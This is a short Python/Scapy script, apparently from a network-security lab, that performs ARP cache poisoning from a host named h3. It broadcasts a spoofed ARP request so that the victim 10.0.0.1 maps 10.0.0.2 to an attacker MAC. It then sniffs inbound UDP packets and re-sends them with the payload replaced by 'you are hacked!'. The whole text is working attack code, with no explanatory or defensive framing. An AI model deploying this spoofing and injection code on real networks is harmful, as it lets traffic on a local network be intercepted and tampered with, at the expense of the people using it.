# ARP Cache Poisoning Script (Runs on h3)
# Mohamed Trigui
# 9/24/2024

from scapy.all import *

def spoof_pkt(pkt):
    ip = IP(src=pkt[IP].src, dst=pkt[IP].dst) # IP Layer
    udp = UDP(sport=pkt[UDP].sport, dport=pkt[UDP].dport) # UDP Layer
    data = pkt[UDP].payload.load.decode() # Payload
    data = "you are hacked!"
    pkt = ip/udp/data

    pkt.show()
    send(pkt, verbose=0)

# ARP Spoofing
VICTIM_IP = "10.0.0.1"
FAKE_IP = "10.0.0.2"
FAKE_MAC = "46:05:c6:65:fc:56"

print("SENDING SPOOFED ARP REQUEST ...")

ether = Ether()
ether.dst = "ff:ff:ff:ff:ff:ff"
ether.src = FAKE_MAC

arp = ARP()
arp.psrc = FAKE_IP
arp.hwsrc = FAKE_MAC
arp.pdst = VICTIM_IP
arp.op = 1

# Construct frame and send it
frame = ether/arp
sendp(frame)

# Sniff UDP packets and spoof them
sniff(filter='udp and inbound', prn=spoof_pkt)
